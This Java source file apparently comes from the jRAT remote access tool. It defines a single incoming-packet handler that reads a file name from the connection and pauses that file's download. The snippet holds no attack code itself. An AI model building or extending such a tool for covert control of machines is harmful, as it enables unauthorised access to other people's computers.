package jrat.client.packets.incoming;

import jrat.common.io.FileCache;
import jrat.client.Connection;

public class Packet102PauseClientDownload extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		
		FileCache.get(file).getRunnable().pause();
	}

}
